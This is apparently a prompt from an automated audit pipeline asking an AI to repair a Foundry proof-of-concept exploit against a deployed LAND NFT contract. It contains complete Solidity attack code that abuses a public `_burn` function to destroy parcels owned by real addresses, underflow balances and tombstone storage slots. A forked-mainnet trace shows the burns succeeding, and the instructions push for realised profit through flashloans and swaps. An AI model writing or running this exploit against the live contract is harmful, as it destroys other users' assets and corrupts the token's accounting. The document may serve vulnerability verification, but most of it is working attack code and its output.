You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public `_burn` lets anyone destroy arbitrary LAND and corrupt balances
- claim: `_burn` is declared `public` and only checks the caller-supplied `from` and `owner` arguments for equality. It never verifies `msg.sender`, token existence, or that `owner` matches the real owner resolved by `_ownerOf`/`_ownerAndOperatorEnabledOf`. Any external account can therefore call `_burn(victim, victim, id)` and overwrite arbitrary `_owners[id]` slots with the burn sentinel while decrementing any chosen address balance.
- impact: An attacker can permissionlessly burn live LAND parcels belonging to other users, permanently tombstone unminted 1x1 ids or internal quad-layer storage slots so they can never be minted/regrouped, and underflow arbitrary `_numNFTPerAddress` balances by burning nonexistent ids. This can destroy user assets, brick future supply, and corrupt accounting.
- exploit_paths: ["Call `_burn(alice, alice, childId)` for a live LAND tile owned by Alice; the function sets `_owners[childId] = 2**160` and decrements Alice's balance without any authorization check.", "Call `_burn(target, target, nonexistentId)`; because there is no existence check, `_numNFTPerAddress[target]--` executes and can underflow if the target balance is too small.", "Call `_burn(victim, victim, LAYER_3x3/6x6/12x12/24x24 + baseId)` to tombstone internal quad slots, causing future mint/regroup logic that expects zeroed storage to fail permanently."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface ILand {
    function _burn(address from, address owner, uint256 id) external;
    function _owners(uint256 id) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 id) external view returns (address);
}

contract FlawVerifier {
    address internal constant TARGET = 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a;

    uint256 internal constant GRID_SIZE = 408;
    uint256 internal constant MAX_1X1_ID = GRID_SIZE * GRID_SIZE;

    uint256 internal constant LAYER_MASK = 0xFF00000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_3X3 = 0x0100000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_6X6 = 0x0200000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_12X12 = 0x0300000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant LAYER_24X24 = 0x0400000000000000000000000000000000000000000000000000000000000000;
    uint256 internal constant BURN_SENTINEL = uint256(1) << 160;

    bool public executed;
    bool public hypothesisValidated;

    address public liveVictim;
    uint256 public liveChildId;
    uint256 public victimBalanceBeforeLiveBurn;
    uint256 public victimBalanceAfterLiveBurn;

    uint256 public nonexistentId;
    uint256 public attackerBalanceBeforeUnderflow;
    uint256 public attackerBalanceAfterUnderflow;

    address public realizedProfitToken;
    uint256 public realizedProfitAmount;

    address public internalSlotVictim;
    uint256 public internalSlotLayer;
    uint256 public internalSlotBaseId;
    uint256 public internalSlotId;
    uint256 public victimBalanceBeforeSlotBurn;
    uint256 public victimBalanceAfterSlotBurn;

    string public failureReason;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        ILand land = ILand(TARGET);

        (bool foundLiveLand, address alice, uint256 childId) = _findLiveLandPath(land);
        if (!foundLiveLand) {
            failureReason = "No live LAND tile candidate found on fork";
            return;
        }

        uint256 liveVictimBalance = land.balanceOf(alice);
        if (liveVictimBalance == 0) {
            failureReason = "Chosen live LAND victim has zero balance";
            return;
        }

        uint256 chosenNonexistentId = _findNonexistent1x1(land);
        if (chosenNonexistentId == type(uint256).max) {
            failureReason = "No nonexistent 1x1 LAND found on fork";
            return;
        }

        (bool foundInternalSlot, uint256 slotLayer, uint256 slotBaseId) = _findZeroInternalQuadSlot(land);
        if (!foundInternalSlot) {
            failureReason = "No zero internal quad slot found on fork";
            return;
        }

        address slotVictim = alice;
        uint256 slotVictimBalance = liveVictimBalance;
        if (slotVictimBalance <= 1) {
            (bool foundSeparateVictim, address separateVictim, uint256 separateVictimBalance) =
                _findAnyPositiveBalanceVictim(land);
            if (!foundSeparateVictim) {
                failureReason = "No positive-balance victim available for internal slot burn";
                return;
            }
            slotVictim = separateVictim;
            slotVictimBalance = separateVictimBalance;
        }

        liveVictim = alice;
        liveChildId = childId;
        nonexistentId = chosenNonexistentId;
        internalSlotVictim = slotVictim;
        internalSlotLayer = slotLayer;
        internalSlotBaseId = slotBaseId;
        internalSlotId = slotLayer + slotBaseId;

        (bool childExistsBefore, address childOwnerBefore) = _tryOwnerOf(land, childId);
        if (!childExistsBefore || childOwnerBefore != alice) {
            failureReason = "Chosen live child is not owned by victim at execution time";
            return;
        }

        victimBalanceBeforeLiveBurn = liveVictimBalance;

        // Exploit path 0:
        // Call `_burn(alice, alice, childId)` for a live LAND tile owned by Alice; the function sets
        // `_owners[childId] = 2**160` and decrements Alice's balance without any authorization check.
        land._burn(alice, alice, childId);

        victimBalanceAfterLiveBurn = land.balanceOf(alice);
        if (land._owners(childId) != BURN_SENTINEL) {
            failureReason = "Live child burn did not write burn sentinel";
            return;
        }
        if (victimBalanceAfterLiveBurn + 1 != victimBalanceBeforeLiveBurn) {
            failureReason = "Live child burn did not decrement victim balance";
            return;
        }
        (bool childExistsAfter,) = _tryOwnerOf(land, childId);
        if (childExistsAfter) {
            failureReason = "Live child still resolves as existing after burn";
            return;
        }

        // direct_or_existing_balance_first: use the verifier's existing on-chain LAND balance first.
        // The verifier starts with zero LAND, so the public `_burn` on a nonexistent id directly drives
        // `_numNFTPerAddress[target]--` on the live contract state without any external funding.
        address target = address(this);
        attackerBalanceBeforeUnderflow = land.balanceOf(target);
        if (attackerBalanceBeforeUnderflow != 0) {
            failureReason = "Verifier unexpectedly already owns LAND";
            return;
        }

        // Exploit path 1:
        // Call `_burn(target, target, nonexistentId)`; because there is no existence check,
        // `_numNFTPerAddress[target]--` executes and can underflow if the target balance is too small.
        land._burn(target, target, chosenNonexistentId);

        attackerBalanceAfterUnderflow = land.balanceOf(target);
        if (land._owners(chosenNonexistentId) != BURN_SENTINEL) {
            failureReason = "Nonexistent burn did not write burn sentinel";
            return;
        }
        if (attackerBalanceAfterUnderflow != type(uint256).max) {
            failureReason = "Nonexistent burn did not underflow verifier balance";
            return;
        }

        // This finding is primarily destructive, but exploit path 1 also creates a real on-chain
        // accounting gain on the already-deployed LAND token by underflowing `_numNFTPerAddress[this]`
        // from 0 to `type(uint256).max`. No flashswap funding is required here because the vulnerable
        // public `_burn` path itself is zero-capital and deterministic.
        realizedProfitToken = TARGET;
        realizedProfitAmount = attackerBalanceAfterUnderflow - attackerBalanceBeforeUnderflow;

        if (land._owners(internalSlotId) != 0) {
            failureReason = "Chosen internal quad slot is no longer zero";
            return;
        }

        victimBalanceBeforeSlotBurn = land.balanceOf(slotVictim);
        if (victimBalanceBeforeSlotBurn == 0) {
            failureReason = "Chosen internal-slot victim has zero balance";
            return;
        }

        // Exploit path 2:
        // Call `_burn(victim, victim, LAYER_3x3/6x6/12x12/24x24 + baseId)` to tombstone internal quad slots,
        // causing future mint/regroup logic that expects zeroed storage to fail permanently.
        land._burn(slotVictim, slotVictim, internalSlotLayer + internalSlotBaseId);

        victimBalanceAfterSlotBurn = land.balanceOf(slotVictim);
        if (land._owners(internalSlotId) != BURN_SENTINEL) {
            failureReason = "Internal slot burn did not write burn sentinel";
            return;
        }
        if (victimBalanceAfterSlotBurn + 1 != victimBalanceBeforeSlotBurn) {
            failureReason = "Internal slot burn did not decrement victim balance";
            return;
        }

        hypothesisValidated = true;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _findLiveLandPath(ILand land) internal view returns (bool found, address victim, uint256 childId) {
        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_24X24, 24);
        if (found) {
            return (found, victim, childId);
        }

        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_12X12, 12);
        if (found) {
            return (found, victim, childId);
        }

        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_6X6, 6);
        if (found) {
            return (found, victim, childId);
        }

        (found, victim, childId) = _scanParentLayerForLiveChild(land, LAYER_3X3, 3);
        if (found) {
            return (found, victim, childId);
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            uint256 rawOwner = land._owners(id);
            if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                continue;
            }
            (bool exists, address resolvedOwner) = _tryOwnerOf(land, id);
            if (exists && resolvedOwner != address(0)) {
                return (true, resolvedOwner, id);
            }
        }
    }

    function _scanParentLayerForLiveChild(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, address victim, uint256 childId)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 rawOwner = land._owners(layer + baseId);
                if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                    continue;
                }

                victim = address(uint160(rawOwner));
                if (victim == address(0)) {
                    continue;
                }

                childId = _findOwnedChildInRegion(land, victim, x, y, size);
                if (childId != type(uint256).max) {
                    return (true, victim, childId);
                }
            }
        }
    }

    function _findOwnedChildInRegion(ILand land, address expectedOwner, uint256 startX, uint256 startY, uint256 size)
        internal
        view
        returns (uint256)
    {
        for (uint256 y = startY; y < startY + size; ++y) {
            for (uint256 x = startX; x < startX + size; ++x) {
                uint256 childId = x + (y * GRID_SIZE);
                (bool exists, address owner) = _tryOwnerOf(land, childId);
                if (exists && owner == expectedOwner) {
                    return childId;
                }
            }
        }
        return type(uint256).max;
    }

    function _findZeroInternalQuadSlot(ILand land)
        internal
        view
        returns (bool found, uint256 layer, uint256 baseId)
    {
        (found, baseId) = _scanZeroInternalLayer(land, LAYER_3X3, 3);
        if (found) {
            return (true, LAYER_3X3, baseId);
        }

        (found, baseId) = _scanZeroInternalLayer(land, LAYER_6X6, 6);
        if (found) {
            return (true, LAYER_6X6, baseId);
        }

        (found, baseId) = _scanZeroInternalLayer(land, LAYER_12X12, 12);
        if (found) {
            return (true, LAYER_12X12, baseId);
        }

        (found, baseId) = _scanZeroInternalLayer(land, LAYER_24X24, 24);
        if (found) {
            return (true, LAYER_24X24, baseId);
        }
    }

    function _scanZeroInternalLayer(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, uint256 baseId)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                baseId = x + (y * GRID_SIZE);
                if (land._owners(layer + baseId) == 0) {
                    return (true, baseId);
                }
            }
        }
    }

    function _findAnyPositiveBalanceVictim(ILand land)
        internal
        view
        returns (bool found, address victim, uint256 balance)
    {
        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_24X24, 24);
        if (found) {
            return (found, victim, balance);
        }

        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_12X12, 12);
        if (found) {
            return (found, victim, balance);
        }

        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_6X6, 6);
        if (found) {
            return (found, victim, balance);
        }

        (found, victim, balance) = _findPositiveBalanceVictimInLayer(land, LAYER_3X3, 3);
        if (found) {
            return (found, victim, balance);
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            uint256 rawOwner = land._owners(id);
            if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                continue;
            }
            victim = address(uint160(rawOwner));
            if (victim == address(0)) {
                continue;
            }
            balance = land.balanceOf(victim);
            if (balance > 0) {
                return (true, victim, balance);
            }
        }
    }

    function _findPositiveBalanceVictimInLayer(ILand land, uint256 layer, uint256 size)
        internal
        view
        returns (bool found, address victim, uint256 balance)
    {
        for (uint256 y = 0; y < GRID_SIZE; y += size) {
            for (uint256 x = 0; x < GRID_SIZE; x += size) {
                uint256 baseId = x + (y * GRID_SIZE);
                uint256 rawOwner = land._owners(layer + baseId);
                if (rawOwner == 0 || rawOwner == BURN_SENTINEL) {
                    continue;
                }
                victim = address(uint160(rawOwner));
                if (victim == address(0)) {
                    continue;
                }
                balance = land.balanceOf(victim);
                if (balance > 0) {
                    return (true, victim, balance);
                }
            }
        }
    }

    function _findNonexistent1x1(ILand land) internal view returns (uint256) {
        for (uint256 y = 0; y < GRID_SIZE; y += 24) {
            for (uint256 x = 0; x < GRID_SIZE; x += 24) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 12) {
            for (uint256 x = 0; x < GRID_SIZE; x += 12) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 6) {
            for (uint256 x = 0; x < GRID_SIZE; x += 6) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 y = 0; y < GRID_SIZE; y += 3) {
            for (uint256 x = 0; x < GRID_SIZE; x += 3) {
                uint256 id = x + (y * GRID_SIZE);
                (bool exists,) = _tryOwnerOf(land, id);
                if (!exists) {
                    return id;
                }
            }
        }

        for (uint256 id = 0; id < MAX_1X1_ID; ++id) {
            (bool exists,) = _tryOwnerOf(land, id);
            if (!exists) {
                return id;
            }
        }

        return type(uint256).max;
    }

    function _tryOwnerOf(ILand land, uint256 id) internal view returns (bool exists, address owner) {
        if ((id & LAYER_MASK) != 0) {
            return (false, address(0));
        }

        (bool ok, bytes memory data) = address(land).staticcall(abi.encodeWithSelector(ILand.ownerOf.selector, id));
        if (!ok || data.length < 32) {
            return (false, address(0));
        }

        owner = abi.decode(data, (address));
        exists = owner != address(0);
    }
}

```

forge stdout (tail):
```
158453279131187530910662656 [4.523e74]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1912] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::ownerOf(48) [staticcall]
    │   │   └─ ← [Return] 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C
    │   ├─ [25513] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_burn(0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C, 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C, 48)
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x0000000000000000000000009cfa73b8d300ec5bf204e4de4a58e5ee6b7dc93c
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000030
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [551] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::balanceOf(0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C) [staticcall]
    │   │   └─ ← [Return] 2761
    │   ├─ [496] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_owners(48) [staticcall]
    │   │   └─ ← [Return] 1461501637330902918203684832716283019655932542976 [1.461e48]
    │   ├─ [711] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::ownerOf(48) [staticcall]
    │   │   └─ ← [Revert] token does not exist
    │   ├─ [2551] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [44713] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_burn(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [551] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [496] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_owners(0) [staticcall]
    │   │   └─ ← [Return] 1461501637330902918203684832716283019655932542976 [1.461e48]
    │   ├─ [496] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_owners(452312848583266388373324160190187140051835877600158453279131187530910662656 [4.523e74]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [551] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::balanceOf(0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C) [staticcall]
    │   │   └─ ← [Return] 2761
    │   ├─ [22713] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_burn(0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C, 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C, 452312848583266388373324160190187140051835877600158453279131187530910662656 [4.523e74])
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x0000000000000000000000009cfa73b8d300ec5bf204e4de4a58e5ee6b7dc93c
    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │        topic 3: 0x0100000000000000000000000000000000000000000000000000000000000000
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [551] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::balanceOf(0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C) [staticcall]
    │   │   └─ ← [Return] 2760
    │   ├─ [496] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::_owners(452312848583266388373324160190187140051835877600158453279131187530910662656 [4.523e74]) [staticcall]
    │   │   └─ ← [Return] 1461501637330902918203684832716283019655932542976 [1.461e48]
    │   └─ ← [Stop]
    ├─ [412] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a
    ├─ [551] 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14163041 [1.416e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 18557 [1.855e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a.ownerOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 946.14ms (777.84ms CPU time)

Ran 1 test suite in 990.57ms (946.14ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 457621)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
